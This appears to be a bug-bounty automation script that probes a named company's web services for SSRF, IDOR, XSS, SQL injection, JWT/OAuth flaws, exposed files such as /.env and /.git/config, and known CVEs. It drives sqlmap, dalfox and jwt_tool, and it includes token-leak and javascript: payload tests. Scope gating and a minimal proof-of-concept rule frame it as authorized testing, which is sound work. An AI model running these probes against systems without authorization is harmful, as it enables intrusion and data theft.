#!/usr/bin/env bash
# bugbounty-probe.sh — Bug bounty vulnerability probing pipeline
#
# Runs targeted vulnerability probes on in-scope authorized targets.
# Every probe is scope-gated. Stops at minimal PoC per program rules.
# Generates structured finding files suitable for H1 report generation.
#
# Usage:
#   bugbounty-probe.sh --program uber --session SESSION_ID
#   bugbounty-probe.sh --program uber --target https://api.uber.com --vuln ssrf
#   bugbounty-probe.sh --program uber --target https://rider.uber.com --vuln all
#   bugbounty-probe.sh --program uber --session S --h1-handle yourhandle@wearehackerone.com

set -euo pipefail

CTF_ROOT="${CTF_ROOT:-$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)}"
SCOPE_CHECK="$CTF_ROOT/scripts/bugbounty-scope.sh"
EXPLOIT_PIPE="$CTF_ROOT/scripts/exploit-pipeline.sh"
SOURCE_AUDIT="$CTF_ROOT/scripts/source-audit.sh"
LEARN_ENGINE="$CTF_ROOT/scripts/learn_engine.py"
BB_PROGRAMS="$CTF_ROOT/agent_ops/bugbounty/programs"
ARTIFACTS_ROOT="$CTF_ROOT/artifacts"
GO_BIN="${HOME}/go/bin"
export PATH="$PATH:$GO_BIN:${HOME}/.local/bin"

PROGRAM_ID=""
SESSION_ID=""
TARGET_URL=""
VULN_TYPE="all"
H1_HANDLE=""
DRY_RUN=false
ACCOUNT_A=""
ACCOUNT_B=""

while [[ $# -gt 0 ]]; do
  case "$1" in
    --program|-p)     PROGRAM_ID="$2";     shift 2 ;;
    --session)        SESSION_ID="$2";     shift 2 ;;
    --target|-t)      TARGET_URL="$2";     shift 2 ;;
    --vuln)           VULN_TYPE="$2";      shift 2 ;;
    --h1-handle)      H1_HANDLE="$2";      shift 2 ;;
    --account-a)      ACCOUNT_A="$2";      shift 2 ;;
    --account-b)      ACCOUNT_B="$2";      shift 2 ;;
    --dry-run)        DRY_RUN=true;        shift ;;
    -h|--help) grep '^#' "$0" | head -15 | sed 's/^# \?//'; exit 0 ;;
    *) echo "[!] Unknown flag: $1"; exit 1 ;;
  esac
done

[[ -z "$PROGRAM_ID" ]] && { echo "[!] --program required"; exit 1; }
[[ -z "$TARGET_URL" && -z "$SESSION_ID" ]] && { echo "[!] --target or --session required"; exit 1; }

PROGRAM_YAML="$BB_PROGRAMS/$PROGRAM_ID/program.yaml"
[[ ! -f "$PROGRAM_YAML" ]] && { echo "[!] Program spec not found: $PROGRAM_YAML"; exit 1; }

[[ -z "$SESSION_ID" ]] && SESSION_ID="probe-$(date +%Y%m%d-%H%M%S)"
[[ -z "$H1_HANDLE" ]] && H1_HANDLE="${H1_HANDLE:-youremail@wearehackerone.com}"

TS=$(date +%Y%m%d-%H%M%S)
FINDINGS_DIR="$ARTIFACTS_ROOT/bugbounty/$PROGRAM_ID/$SESSION_ID/findings"
RECON_DIR="$ARTIFACTS_ROOT/bugbounty/$PROGRAM_ID/$SESSION_ID/recon"
mkdir -p "$FINDINGS_DIR"

ts()   { date +%H:%M:%S; }
log()  { echo "[$(ts)] $*"; }
ok()   { echo "[$(ts)] [+] $*"; }
warn() { echo "[$(ts)] [!] $*"; }
err()  { echo "[$(ts)] [-] $*"; }

# ── Scope gate ────────────────────────────────────────────────────────────────
require_in_scope() {
  local url="$1"
  local domain
  domain=$(echo "$url" | sed 's|https\?://||' | sed 's|/.*||')
  local result
  result=$("$SCOPE_CHECK" --target "$domain" --program "$PROGRAM_ID" --quiet 2>/dev/null || echo "OUT_OF_SCOPE")
  if [[ "$result" != "IN_SCOPE" ]]; then
    err "SCOPE GATE: $domain is $result — aborting probe"
    return 1
  fi
  return 0
}

# ── YAML helpers ──────────────────────────────────────────────────────────────
yaml_val() {
  grep "^    ${1}:" "$PROGRAM_YAML" 2>/dev/null | awk '{print $2}' | tr -d '"' | head -1 || echo ""
}

SSRF_SHERIFF=$(grep "ssrf_sheriff:" "$PROGRAM_YAML" | awk '{print $2}' | tr -d '"' | head -1 || echo "")
SSRF_SHERIFF="${SSRF_SHERIFF//\{handle\}/${H1_HANDLE}}"

# ── Finding helper ────────────────────────────────────────────────────────────
save_finding() {
  local vuln="$1" target="$2" severity="$3" evidence="$4" impact="$5"
  local fname="${FINDINGS_DIR}/${vuln}_$(date +%H%M%S).md"
  {
    echo "# Finding: $vuln"
    echo ""
    echo "- target: $target"
    echo "- vuln_type: $vuln"
    echo "- severity: $severity"
    echo "- ts: $TS"
    echo "- program: $PROGRAM_ID"
    echo ""
    echo "## Evidence"
    echo ""
    echo '```'
    echo "$evidence"
    echo '```'
    echo ""
    echo "## Security Impact"
    echo ""
    echo "$impact"
    echo ""
    echo "## What worked"
    echo ""
    echo "- $vuln confirmed on $target"
    echo ""
  } > "$fname"
  ok "Finding saved: $fname"
  echo "$fname"
}

# ══════════════════════════════════════════════════════════════════════════════
# Build target list
# ══════════════════════════════════════════════════════════════════════════════
PROBE_TARGETS=()
if [[ -n "$TARGET_URL" ]]; then
  PROBE_TARGETS=("$TARGET_URL")
elif [[ -f "$RECON_DIR/live_hosts.txt" ]]; then
  mapfile -t PROBE_TARGETS < <(grep -oE 'https?://[^ ]+' "$RECON_DIR/live_hosts.txt" | head -20 || true)
fi

[[ ${#PROBE_TARGETS[@]} -eq 0 ]] && { warn "No targets. Run bugbounty-recon.sh first or provide --target."; exit 0; }
log "Probe targets: ${#PROBE_TARGETS[@]}"

# ══════════════════════════════════════════════════════════════════════════════
# SSRF Probing (priority 1 for Uber)
# ══════════════════════════════════════════════════════════════════════════════
probe_ssrf() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "SSRF probe: $target"

  # Collect URL/redirect parameters from historical URLs and crawl
  local param_file="$RECON_DIR/params.txt"
  local ssrf_params=()

  # Common SSRF-prone param names
  SSRF_PARAM_NAMES=(url uri redirect next return_url callback webhook endpoint
                    dest destination path proxy forward host image img src link
                    load file fetch resource data import export feed)

  # Also check historical URLs for known param patterns
  if [[ -f "$RECON_DIR/all_urls.txt" ]]; then
    for param in "${SSRF_PARAM_NAMES[@]}"; do
      while IFS= read -r hit; do
        ssrf_params+=("$hit")
      done < <(grep -iE "[?&]${param}=" "$RECON_DIR/all_urls.txt" | head -5 || true)
    done
  fi

  # Also scan for URL params in crawl results
  for param in "${SSRF_PARAM_NAMES[@]}"; do
    # Build test URL
    local test_url="${target}?${param}=${SSRF_SHERIFF}"
    if [[ -n "$SSRF_SHERIFF" ]] && ! $DRY_RUN; then
      local response
      response=$(curl -sk --max-time 10 -D - "$test_url" 2>/dev/null | head -30 || true)
      # Check if sheriff token appears in response (SSRF confirmed)
      if echo "$response" | grep -qi "x-ssrf-sheriff\|ssrf.*token\|X-Canary-Token"; then
        warn "SSRF CONFIRMED: $test_url"
        save_finding "ssrf" "$target" "Critical" \
          "GET $test_url

Response:
$response" \
          "SSRF confirmed via SSRF Sheriff. Attacker can make internal requests on behalf of the server.
Impact: Access to internal infrastructure, metadata services, AWS credentials via 169.254.169.254."
        return 0
      fi
    elif $DRY_RUN; then
      log "  [dry-run] Would test: $test_url"
    fi
  done

  # Test PDF/image generation endpoints (common SSRF entry points)
  local pdf_endpoints
  pdf_endpoints=$(grep -E "(pdf|export|download|generate|render|screenshot|preview)" \
    "$RECON_DIR/all_urls.txt" 2>/dev/null | head -10 || true)
  if [[ -n "$pdf_endpoints" ]] && ! $DRY_RUN; then
    while IFS= read -r endpoint; do
      require_in_scope "$endpoint" || continue
      local test_url="${endpoint}&url=${SSRF_SHERIFF}"
      response=$(curl -sk --max-time 10 -D - "$test_url" 2>/dev/null | head -20 || true)
      if echo "$response" | grep -qi "x-ssrf-sheriff\|ssrf.*token"; then
        warn "SSRF in render/export endpoint: $endpoint"
        save_finding "ssrf" "$endpoint" "High" \
          "Test: $test_url\nResponse: $response" \
          "SSRF in document generation endpoint. Can make internal requests."
      fi
    done <<< "$pdf_endpoints"
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
# IDOR Probing
# ══════════════════════════════════════════════════════════════════════════════
probe_idor() {
  local target="$1"
  require_in_scope "$target" || return 1

  if [[ -z "$ACCOUNT_A" || -z "$ACCOUNT_B" ]]; then
    warn "IDOR probe requires two test accounts. Use --account-a and --account-b."
    warn "Pattern: log into account A, collect object IDs, test access with account B's session."
    {
      echo "# IDOR Manual Testing Guide"
      echo ""
      echo "## Setup"
      echo "- Account A (your main test account): $ACCOUNT_A"
      echo "- Account B (second test account): $ACCOUNT_B"
      echo ""
      echo "## High-value IDOR targets for Uber"
      echo "- /api/v*/trips/{id} — trip data (payment, location, driver)"
      echo "- /api/v*/users/{uuid} — profile data"
      echo "- /api/v*/payments/{id} — payment methods"
      echo "- /api/v*/receipts/{id} — trip receipts"
      echo "- /api/v*/messages/{id} — in-app messages"
      echo ""
      echo "## Steps"
      echo "1. With Account A: GET /api/v1/trips — collect IDs"
      echo "2. With Account B session: GET /api/v1/trips/{Account_A_ID}"
      echo "3. If response returns Account A's data → IDOR confirmed"
      echo ""
    } > "$FINDINGS_DIR/idor_manual_guide_$(date +%H%M%S).md"
    return 0
  fi

  log "IDOR probe: $target (account-based)"
  # Automated: try common ID-bearing endpoints with account B's session on A's IDs
  # This is a framework — actual cookie/token must be provided by operator
  local idor_endpoints=(
    "/api/v1/trips"
    "/api/trips"
    "/v1/trips"
    "/api/users/me"
    "/api/v1/profile"
  )

  for endpoint in "${idor_endpoints[@]}"; do
    local url="${target}${endpoint}"
    require_in_scope "$url" || continue
    local response
    response=$(curl -sk --max-time 10 \
      -H "Cookie: ${ACCOUNT_A}" \
      "$url" 2>/dev/null | python3 -c "
import sys, json, re
try:
    d = json.load(sys.stdin)
    # Extract IDs (UUIDs or numeric)
    ids = re.findall(r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|\"id\":\s*(\d+)', str(d))
    print('\n'.join(ids[:5]))
except: pass
" 2>/dev/null || true)

    if [[ -n "$response" ]]; then
      log "  Found IDs at $endpoint — test with account B for IDOR"
      {
        echo "# IDOR Candidate: $endpoint"
        echo ""
        echo "Account A IDs found:"
        echo "$response"
        echo ""
        echo "Next: test these IDs with Account B's session cookie."
        echo ""
      } > "$FINDINGS_DIR/idor_candidate_$(date +%H%M%S).md"
    fi
  done
}

# ══════════════════════════════════════════════════════════════════════════════
# XSS Probing
# ══════════════════════════════════════════════════════════════════════════════
probe_xss() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "XSS probe: $target"

  # Skip self-XSS indicators in URL (OOS for Uber)
  if echo "$target" | grep -qi "self\|console\|localhost"; then
    warn "Skipping potential self-XSS target: $target"
    return 0
  fi

  if $DRY_RUN; then
    log "  [dry-run] Would run: dalfox url $target"
    return 0
  fi

  if command -v dalfox &>/dev/null; then
    local xss_out="$FINDINGS_DIR/xss_dalfox_$(date +%H%M%S).txt"
    timeout 120 dalfox url "$target" \
      --silence --no-color \
      --skip-bav \
      --output "$xss_out" 2>/dev/null || true

    if [[ -s "$xss_out" ]]; then
      local hit_count
      hit_count=$(grep -c "VULN" "$xss_out" 2>/dev/null || echo 0)
      if [[ "$hit_count" -gt 0 ]]; then
        warn "XSS found ($hit_count): $target"
        save_finding "xss" "$target" "Medium" \
          "$(cat "$xss_out" | head -30)" \
          "Reflected/Stored XSS. Attacker can execute JavaScript in victim's browser context.
Impact: Session hijacking, credential theft, unauthorized actions on behalf of victim."
      fi
    fi
  elif [[ -f "${HOME}/tools/bugbounty/XSStrike/xsstrike.py" ]]; then
    timeout 60 python3 "${HOME}/tools/bugbounty/XSStrike/xsstrike.py" \
      --url "$target" --skip --json 2>/dev/null | \
      grep -i "vulnerability\|XSS" | head -10 || true
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
# SQLi Probing
# ══════════════════════════════════════════════════════════════════════════════
probe_sqli() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "SQLi probe: $target (minimal footprint)"

  # Only test if URL has parameters
  if ! echo "$target" | grep -q '?'; then
    log "  No params in URL — checking historical URLs for SQLi candidates..."
    if [[ -f "$RECON_DIR/all_urls.txt" ]]; then
      target=$(grep -E '\?' "$RECON_DIR/all_urls.txt" | \
        grep -v "\.(js|css|img|png|jpg|gif|svg)" | head -1 || echo "")
      [[ -z "$target" ]] && { log "  No param URLs found for SQLi"; return 0; }
    fi
  fi

  $DRY_RUN && { log "  [dry-run] Would run: sqlmap --level 2 --risk 1 $target"; return 0; }

  if command -v sqlmap &>/dev/null; then
    local sqli_out="$FINDINGS_DIR/sqli_sqlmap_$(date +%H%M%S).txt"
    # Minimal footprint: level 2, risk 1, stop at first injection, no dump
    timeout 180 sqlmap -u "$target" \
      --level=2 --risk=1 \
      --batch --smart \
      --stop-at-first-dump-file \
      --no-cast \
      --output-dir="$FINDINGS_DIR/sqlmap" \
      2>/dev/null | tee "$sqli_out" | grep -E "(sqlmap identified|injectable|vulnerable)" || true

    if grep -qi "injectable\|vulnerable" "$sqli_out" 2>/dev/null; then
      warn "SQLi found: $target"
      save_finding "sqli" "$target" "High" \
        "$(grep -E '(injectable|vulnerable|identified)' "$sqli_out" | head -10)" \
        "SQL injection confirmed. Attacker may be able to read/write database content.
STOP — do not dump data beyond confirming injection point."
    fi
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
# Auth / JWT / OAuth probing
# ══════════════════════════════════════════════════════════════════════════════
probe_auth() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "Auth probe: $target"

  # JWT tool checks (algorithm confusion, none attack)
  if [[ -f "${HOME}/tools/bugbounty/jwt_tool/jwt_tool.py" ]]; then
    # Find JWT tokens in crawled URLs or responses
    local jwt_test_targets
    jwt_test_targets=$(grep -rh "Bearer\|eyJ" "$RECON_DIR" 2>/dev/null | \
      grep -oE 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -3 || true)
    if [[ -n "$jwt_test_targets" ]]; then
      log "  JWT tokens found — running jwt_tool..."
      while IFS= read -r token; do
        $DRY_RUN && { log "  [dry-run] Would test JWT: ${token:0:20}..."; continue; }
        timeout 30 python3 "${HOME}/tools/bugbounty/jwt_tool/jwt_tool.py" \
          "$token" -X a 2>/dev/null | \
          grep -iE "(alg:none|algorithm confusion|vulnerable)" | head -5 || true
      done <<< "$jwt_test_targets"
    fi
  fi

  # OAuth redirect_uri check
  local oauth_endpoints
  oauth_endpoints=$(grep -E "(oauth|authorize|callback|redirect)" "$RECON_DIR/all_urls.txt" 2>/dev/null | head -5 || true)
  if [[ -n "$oauth_endpoints" ]]; then
    log "  OAuth endpoints found — documenting for manual testing"
    {
      echo "# OAuth/Auth Manual Testing Guide"
      echo ""
      echo "## Endpoints found:"
      echo "$oauth_endpoints" | head -10
      echo ""
      echo "## Tests to run:"
      echo "- redirect_uri: change to attacker domain, check if tokens leak"
      echo "- state param: remove state param, check for CSRF on OAuth flow"
      echo "- open redirect: replace redirect_uri with javascript:alert(1)"
      echo "- token reuse: replay captured tokens"
      echo ""
    } > "$FINDINGS_DIR/auth_manual_guide_$(date +%H%M%S).md"
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
# Info disclosure probing
# ══════════════════════════════════════════════════════════════════════════════
probe_info_disclosure() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "Info disclosure probe: $target"

  DISCLOSURE_PATHS=(
    "/.env"
    "/api-docs"
    "/api-docs.json"
    "/swagger.json"
    "/swagger/v1/swagger.json"
    "/v2/api-docs"
    "/openapi.json"
    "/graphql"
    "/.git/config"
    "/debug"
    "/actuator"
    "/actuator/env"
    "/actuator/mappings"
    "/metrics"
    "/health"
    "/server-status"
    "/phpinfo.php"
    "/info.php"
    "/__debug__"
    "/console"
    "/_profiler"
    "/telescope"
    "/horizon"
  )

  for path in "${DISCLOSURE_PATHS[@]}"; do
    $DRY_RUN && { log "  [dry-run] Would check: ${target}${path}"; continue; }
    local url="${target}${path}"
    local status
    status=$(curl -sk --max-time 8 -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
    if [[ "$status" == "200" ]]; then
      local body
      body=$(curl -sk --max-time 8 "$url" 2>/dev/null | head -20 || true)
      # Filter out generic 200s that are just login pages
      if ! echo "$body" | grep -qi "404\|not found\|login\|unauthorized" && [[ -n "$body" ]]; then
        warn "Possible disclosure: $url [$status]"
        save_finding "info_disclosure" "$url" "Medium" \
          "GET $url → $status\n\n$(echo "$body" | head -10)" \
          "Sensitive endpoint exposed without authentication.
Impact depends on content — could expose environment vars, API keys, internal routes."
      fi
    fi
    # Check for source maps
    if [[ "$path" != "/.git/config" ]]; then
      local js_map_url="${target}/static/js/main.js.map"
      map_status=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$js_map_url" 2>/dev/null || echo "000")
      if [[ "$map_status" == "200" ]]; then
        warn "Source map exposed: $js_map_url"
        save_finding "info_disclosure" "$js_map_url" "Low" \
          "GET $js_map_url → $map_status" \
          "JavaScript source map exposed. Attacker can reconstruct minified source code."
        break  # Only need one example
      fi
    fi
  done
}

# ══════════════════════════════════════════════════════════════════════════════
# CVE / Service version checks
# ══════════════════════════════════════════════════════════════════════════════
probe_cve() {
  local target="$1"
  require_in_scope "$target" || return 1
  log "CVE check: $target"

  # Banner grab to identify service versions
  local server_header
  server_header=$(curl -sk --max-time 8 -I "$target" 2>/dev/null | \
    grep -iE "^server:|^x-powered-by:|^x-generator:" | head -3 || true)

  if [[ -n "$server_header" ]]; then
    log "  Server headers: $server_header"
    # Extract service/version and pipe to exploit-pipeline
    local service_str
    service_str=$(echo "$server_header" | head -1 | sed 's/^[Ss]erver: //' | tr -d '\r')
    if [[ -n "$service_str" ]] && [[ -f "$EXPLOIT_PIPE" ]]; then
      log "  Running exploit-pipeline for: $service_str"
      $DRY_RUN && { log "  [dry-run] Would run: exploit-pipeline.sh -s '$service_str'"; return 0; }
      bash "$EXPLOIT_PIPE" -s "$service_str" \
        --top 3 \
        --session "$SESSION_ID" 2>/dev/null | tail -15 || true
    fi
  fi
}

# ══════════════════════════════════════════════════════════════════════════════
# Main probe dispatcher
# ══════════════════════════════════════════════════════════════════════════════
TOTAL_FINDINGS=0
log "Starting probe: program=$PROGRAM_ID vuln=$VULN_TYPE targets=${#PROBE_TARGETS[@]}"

for target in "${PROBE_TARGETS[@]}"; do
  log "--- Target: $target ---"

  # Final scope gate
  require_in_scope "$target" || { warn "Skipping OOS: $target"; continue; }

  case "$VULN_TYPE" in
    ssrf)               probe_ssrf "$target" ;;
    idor)               probe_idor "$target" ;;
    xss)                probe_xss "$target" ;;
    sqli)               probe_sqli "$target" ;;
    auth|jwt|oauth)     probe_auth "$target" ;;
    info|info_disclosure) probe_info_disclosure "$target" ;;
    cve)                probe_cve "$target" ;;
    all)
      probe_info_disclosure "$target"
      probe_cve "$target"
      probe_ssrf "$target"
      probe_xss "$target"
      probe_auth "$target"
      probe_idor "$target"
      probe_sqli "$target"
      ;;
    *)
      err "Unknown vuln type: $VULN_TYPE"
      echo "Valid types: ssrf, idor, xss, sqli, auth, info_disclosure, cve, all"
      exit 1
      ;;
  esac
done

TOTAL_FINDINGS=$(find "$FINDINGS_DIR" -name "*.md" 2>/dev/null | wc -l || echo 0)
ok "Probe complete. Findings: $TOTAL_FINDINGS files in $FINDINGS_DIR"

# Ingest findings into learn_engine
if [[ -f "$LEARN_ENGINE" ]] && [[ "$TOTAL_FINDINGS" -gt 0 ]]; then
  log "Ingesting findings..."
  find "$FINDINGS_DIR" -name "*.md" | while read -r f; do
    python3 "$LEARN_ENGINE" --root "$CTF_ROOT" ingest \
      --session-id "$SESSION_ID" --source-path "$f" 2>/dev/null | tail -1 || true
  done
fi

echo ""
echo "Next step: bugbounty-report.sh --program $PROGRAM_ID --session $SESSION_ID"
